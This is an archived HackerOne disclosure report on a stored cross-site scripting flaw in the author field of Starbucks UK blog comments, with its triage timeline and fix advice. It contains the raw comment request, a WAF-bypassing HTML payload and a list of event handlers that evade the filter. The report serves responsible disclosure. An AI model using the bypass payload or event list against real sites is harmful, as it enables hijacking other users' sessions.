---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
  - vuln/xss-stored
  - vuln/xss
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2017-06-27
submitted: 2017-04-02T23:18:08.913Z
bounty_usd: null
votes: 19
cve: []
program: "[[programs/starbucks|Starbucks]]"
reporter: "bayotop"
source: "https://hackerone.com/reports/218226"
title: "Stored XSS in comments on https://www.starbucks.co.uk/blog/*"
---
# Stored XSS in comments on https://www.starbucks.co.uk/blog/*

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 19 | **Program:** Starbucks | **Disclosed:** 2017-06-27

- Report: [https://hackerone.com/reports/218226](https://hackerone.com/reports/218226)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2017-04-02T23:18:08.913Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi,

there are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork `site:www.starbucks.co.uk inurl:blog/`. Notice the comments functionality at the bottom at the page.

When a comment is sent the following request is made:
```http
POST /blog/addcomment HTTP/1.1
Host: www.starbucks.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
Content-Length: 321
Cookie: [redacted]
Connection: close

Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com
```
The values of the `Body` and `author` parameters will be rendered into the page as a new comment. The value from the `author` parameter is not correctly encoded. This allows to inject arbitrary valid HTML.

You seem to be using a WAF which will block request (500) containing `<script></script>` and various input matching `on*=`.  However, I managed to find a bypass:

```html
</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
```

This will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability

Note that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).

Here is a list of all potential `on*=` events I could find, that will bypass your WAF an can be used to create cross-browser payloads:

```
onsearch
onwebkitanimationiteration
onwebkitanimationstart
onanimationiteration
onwebkitanimationend
onanimationstart
ondataavailable
ontransitionend
onanimationend
onreceived
onpopstate
```

To fix this issue make sure the `author` value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.

Please let me know in case you need any more information from my side.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2017-04-03** @rubikcube: Hey @bayotop 

Am i right you do need a valid account for the Starbucks blog? How would an attacker gain one? 

best

@rubikcube
- **2017-04-03** @bayotop: I used this link - https://www.starbucks.co.uk/account/signin - to create a test account. Once I was authenticated, I was free to post comments on https://www.starbucks.co.uk/blogs/*. See the comments at the bottom of this page -
 https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability.

If this is not intended behavior., then that would be a whole different issue on it's own. 

Nonetheless, I would strongly recommend fixing the XSS issue described above. "A valid account for the Starbucks blog is needed" is a very dangerous presumption in this case. Totally legitimate accounts can be compromised in many different ways and then used to hijack other user's session by the XSS described above. Also you never know when legitimate users turn malicous. 

I am correct assuming you were now able to reproduce the issue?
- **2017-04-04** @rubikcube: Hey @bayotop 

I was able to confirm your submission, could you please remove the comments? 

Thanks!

@rubikcube
- **2017-04-04** @bayotop: Hi @rubikcube,

I am happy to hear that. 

I'd love to remove the comments, but there seems to be no option for that. The only options I can see are `Reply`, `Flagged` and `Permalink`.
- **2017-04-11** @bayotop: Hi,

Just wondering whether there has been any action or progress made on this report?
Thanks.
- **Report Triaged**
- **Bounty Awarded**
- **2017-04-27** @bayotop: Hi @siren,

Glad to hear that and thanks for the bounty. Let me know if I can be of any further assistance.
- **2017-05-22** @bayotop: Hi,

Since it's been one month now, do you have any updates on when this issue will be resolved? Thanks.
- **2017-06-08** @bayotop: Seems like ```https://www.starbucks.*/blog/*``` permanently redirects to https://1912pike.com making this publicly unexploitable. Still, you should definitely fix the issue in case the blog functionality is accessible internally. 

Anyway, I am considering this issue resolved.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Report Severity Updated**
